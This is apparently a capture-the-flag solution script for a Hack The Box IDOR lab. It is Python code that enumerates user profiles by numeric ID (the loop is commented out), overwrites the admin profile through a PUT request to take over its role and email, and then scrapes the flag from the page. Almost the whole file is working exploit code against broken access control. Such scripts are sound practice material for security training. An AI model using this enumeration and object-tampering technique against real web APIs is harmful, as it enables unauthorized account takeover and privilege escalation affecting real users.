import requests
import re

url = "http://167.71.131.210:31981"

session = requests.Session()

# for i in range(1, 11):
# 	r = session.get(url + f"/profile/api.php/profile/{str(i)}")
# 	print(r.text)
# found that admin role as staff_admin

# change the admin's email to flag@idor.htb
admin_data = {
  "uid": "10",
  "uuid": "bfd92386a1b48076792e68b596846499",
  "role": "staff_admin",
  "full_name": "admin",
  "email": "flag@idor.htb",
  "about": "Never gonna give you up, Never gonna let you down"
}

r1 = session.put(url + "/profile/api.php/profile/10", json=admin_data)
r2 = session.get(url + "/profile/index.php")
flagRgx = re.compile(r'HTB{.*}')
flag = flagRgx.search(r2.text)
print(flag.group())




